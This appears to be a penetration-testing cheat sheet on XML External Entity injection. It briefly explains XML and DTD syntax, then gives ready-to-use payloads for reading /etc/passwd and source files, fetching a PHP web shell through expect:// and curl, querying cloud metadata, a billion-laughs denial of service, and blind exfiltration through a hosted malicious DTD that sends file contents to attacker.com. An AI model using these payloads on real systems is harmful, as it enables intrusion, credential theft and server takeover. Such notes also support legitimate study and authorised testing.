# XML External Entity (XXE) Injection

## How do XXE vulnerabilities arise?

* Applications use the XML format to transmit data between the browser and the server
* XML specification contains dangerous features, and standard parsers support these features
* When XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.

<table><thead><tr><th width="110.8568115234375">Key</th><th width="399.428466796875">Definition</th><th>Example</th></tr></thead><tbody><tr><td>Tag</td><td>The keys of an XML document, usually wrapped with (<code>&#x3C;</code>/<code>></code>) characters.</td><td><code>&#x3C;date></code></td></tr><tr><td>Entity</td><td>XML variables, usually wrapped with (<code>&#x26;</code>/<code>;</code>) characters.</td><td><code>&#x26;lt;</code></td></tr><tr><td>Element</td><td>The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.</td><td><code>&#x3C;date>01-01-2022&#x3C;/date></code></td></tr><tr><td>Attribute</td><td>Optional specifications for any element that are stored in the tags, which may be used by the XML parser.</td><td><code>version="1.0"</code>/<code>encoding="UTF-8"</code></td></tr><tr><td>Declaration</td><td>Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.</td><td><code>&#x3C;?xml version="1.0" encoding="UTF-8"?></code></td></tr></tbody></table>

## XML DTD

* **XML Document Type Definition (DTD)** allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file.
* The  DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. `email.dtd`), and then referenced within the XML document with the `SYSTEM` keyword.
* <pre class="language-xml" data-line-numbers><code class="lang-xml">&#x3C;?xml version="1.0" encoding="UTF-8"?>
  &#x3C;!DOCTYPE email SYSTEM "email.dtd">
  &#x3C;!-- OR -->
  &#x3C;?xml version="1.0" encoding="UTF-8"?>
  &#x3C;!DOCTYPE email SYSTEM "http://url/email.dtd">
  </code></pre>

## XML Entities

* We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data which is done using `ENTITY` keyword.
* Entity can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g. `&company;`).
* Whenever an entity is referenced, it will be replaced with its value by the XML parser.&#x20;
* We can reference External XML Entities with the `SYSTEM` keyword.
* We may also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources.
* <pre class="language-xml" data-line-numbers><code class="lang-xml">&#x3C;?xml version="1.0" encoding="UTF-8"?>
  &#x3C;!DOCTYPE email [
    &#x3C;!ENTITY company SYSTEM "http://localhost/company.txt">
    &#x3C;!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
  ]>
  </code></pre>
* `% xxe` -> Parameter entity and invoked only within the DTD as `%xxe;`
* `xxe` -> External entity and invoked anywhere as `&xxe;`

## Local File Disclosure <a href="#local-file-disclosure" id="local-file-disclosure"></a>

* #### Identify
  * Find web pages that accept an XML user input.
  * To print the content of an external file to the page, we should note which elements are being displayed, such that we know which elements to inject into.
* #### Exploit
  * &#x20;If the `DOCTYPE` was already declared in the XML request, we would just add the `ENTITY` element to it.
  * `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`&#x20;
  * `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>`
  * Reference the entity `&xxe;`  in any one of the elements.
* Enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an `id_rsa` SSH key of a specific user, which may grant us access to the back-end server.
* Another benefit of local file disclosure is the ability to obtain the source code of the web application.
* If a file contains some of XML's special characters (e.g. `<`/`>`/`&`), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.

## Remote Code Execution

* The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server.&#x20;
* Fetch a web shell from our attacker server and writing it to the web app, and then we can interact with it to execute commands.
* `echo '<?php system($_REQUEST["cmd"]);?>' > shell.php` -> `sudo python3 -m http.server 80`&#x20;
* `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'<IP>/shell.php"> ]>`&#x20;
* We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax.

## SSRF attacks

* The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/.&#x20;
* `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>`
* Same URL for every scenario (default IP set for EC2 metadata)

## DOS Attacks

* <pre class="language-xml" data-line-numbers><code class="lang-xml">&#x3C;?xml version="1.0"?>
  &#x3C;!DOCTYPE email [
    &#x3C;!ENTITY a0 "DOS" >
    &#x3C;!ENTITY a1 "&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;&#x26;a0;">
    &#x3C;!ENTITY a2 "&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;&#x26;a1;">
    &#x3C;!ENTITY a3 "&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;&#x26;a2;">
    &#x3C;!ENTITY a4 "&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;&#x26;a3;">
    &#x3C;!ENTITY a5 "&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;&#x26;a4;">
    &#x3C;!ENTITY a6 "&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;&#x26;a5;">
    &#x3C;!ENTITY a7 "&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;&#x26;a6;">
    &#x3C;!ENTITY a8 "&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;&#x26;a7;">
    &#x3C;!ENTITY a9 "&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;&#x26;a8;">        
    &#x3C;!ENTITY a10 "&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;&#x26;a9;">        
  ]>
  &#x3C;root>
  &#x3C;email>&#x26;a10;&#x3C;/email>
  &#x3C;/root>
  </code></pre>
* However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference.

## Blind XXE Vulnerabilities

* **To Exfiltrate Data use 2 Methods**
  * OAST technique using collaborator or similar tools&#x20;
  * By triggering error messages that can contain sensitive data

### Blind XXE - Out-of-Band Interaction

* `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http:burpcollaborator"> ]>`&#x20;
* Invoke `&xxe;` in any of the existing data elements or within the XML document

### Blind XXE - Out-of-Band Interaction via XML Parameter Entities &#x20;

* `<!DOCTYPE foo [ <!ENTITY % xxe; SYSTEM "http://burpcollaborator" > %xxe; ]>`&#x20;
* Invoke `%xxe;` within the existing DTD if the above method does not work

### Blind XXE - Exfiltrate Data Out-of-Band <sub>(only if application allows to fetch contents remotely)</sub>

* Create a `malicious.dtd` external DTD file and host it in attacker controlled server to be fetched by victim server
* Payload to be provided in victim application
  * `<!DOCTYPE foo [ % xxe; SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>`

<details>

<summary>Malicious.dtd</summary>

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://www.attacker.com/?x=%file; '>">
%eval;
%exfiltrate;
```

</details>

### Blind XXE - Retrieve Data via Error Messages <sub>(only if application allows to fetch contents remotely)</sub>

* Effective only if the application returns the resulting error message within its response
* Host external DTD `malicious.dtd`&#x20;
* Payload to be provided in victim application&#x20;
  * `<!DOCTYPE foo [ % xxe; SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>`
* External DTD is only possible because XML parameter entity can be used within the definition of another parameter entity which is not possible in internal DTD

<details>

<summary>Malicious.dtd</summary>

{% code lineNumbers="true" %}
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
{% endcode %}

</details>

### Blind XXE - Repurposing a Local DTD <sub>(if remote fetching of DTD file is not allowed)</sub>

* Exploitable if a document's DTD uses hybrid model (ie internal and external DTD declarations)
* The restriction on using an XML parameter entity within the definition of another parameter entity is relaxed
* External DTD that is local to the application server since out-of-band connections are blocked&#x20;

## Locating an Existing DTD File to Repurpose

* Here ISOamso is an external entity that is redefined within the internal DTD to trigger an error message that displays the data

<details>

<summary>Existing Local DTD</summary>

{% code lineNumbers="true" %}
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
{% endcode %}

</details>

<details>

<summary>Modified DTD</summary>

{% code lineNumbers="true" %}
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
{% endcode %}

</details>

## XInclude attacks

* When client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service
* XInclude is a part of the XML specification that allows an XML document to be built from sub-documents.
* Place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document&#x20;
* Below code is added to a normal application that takes parameters in URL-encoded format (eg: productid=1\&storeid=1)
* Input the payload to productid="payload" -- if the backend server parses this as an XML document the payload gets executed (blind)

<details>

<summary>Payload</summary>

{% code lineNumbers="true" %}
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
{% endcode %}

</details>

## XXE Attacks via File Upload

* XML based formats are office document formats like DOCX and image formats like SVG
* If the above extensions are possible, try uploading an SVG image with malicious payload that gets displayed within the application (profile pic etc.)&#x20;
* Store the below payload as SVG file extension and upload -> output will be as the image

<details>

<summary>SVG Payload</summary>

{% code lineNumbers="true" %}
```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
        <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
```
{% endcode %}

</details>

## XXE attacks via modified content type

* POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`
* Some web sites expect to receive requests in this format but will tolerate other content types, including XML.
* Change the content-type header from `URL-encoded` to `text/xml`  or `application/xml` and provide the parameters in XML format.
* If application accepts the XML format, try for XML vulnerability mentioned above.
* If a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm).

| XQuery Injection | `'` `;` `--` `/* */`                              |
| ---------------- | ------------------------------------------------- |
| XPath Injection  | `'` `or` `and` `not` `substring` `concat` `count` |
